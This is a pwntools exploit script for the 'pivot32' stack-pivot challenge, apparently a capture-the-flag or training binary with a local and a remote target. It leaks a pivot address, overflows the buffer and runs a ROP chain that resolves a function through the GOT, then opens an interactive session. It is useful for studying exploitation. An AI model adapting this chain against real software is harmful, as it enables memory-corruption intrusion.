#coding=utf8
from pwn import *
import re
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context.arch = 'i386'

local = 1

if local:
	cn = process('./pivot32')
	# bin = ELF('./task_shoppingCart',checksec=False)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	# libc = ELF('/lib/i386-linux-gnu/libc.so.6',checksec=False)

else:
	cn = remote('117.78.27.105', 30403)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	pass


def z(a=''):
	if local:
		gdb.attach(cn,a)
		if a == '':
			raw_input()

foothold_plt     = 0x80485f0
foothold_got_plt = 0x804a024

pop_eax      = 0x080488c0 # pop eax ; ret
pop_ebx      = 0x08048571 # pop ebx ; ret

mov_eax      = 0x080488c4 # mov eax, [eax] ; ret
add_eax_ebp  = 0x080488c7 # add eax, ebp ; ret
call_eax     = 0x080486a3 # call eax
leave_ret    = 0x0804889f # leave; ret;
z('b*0x0804889F\nc')

x = cn.recvuntil('>')

rop_stage2 = p32(foothold_plt)
rop_stage2 += p32(pop_eax)
rop_stage2 += p32(foothold_got_plt)
rop_stage2 += p32(mov_eax)
rop_stage2 += p32(pop_ebx)
rop_stage2 += p32(0x1f7)
rop_stage2 += p32(add_eax_ebp)
rop_stage2 += p32(call_eax)

cn.sendline(rop_stage2)

res = re.findall(r'0x[\da-f]{1,9}',x)
print res[0]
address = int(res[0],16)
exp = "A" * 0x28 + p32(address)
exp += p32(leave_ret) + 'BBBB'

cn.recvuntil('>')

cn.sendline(exp)
cn.interactive()
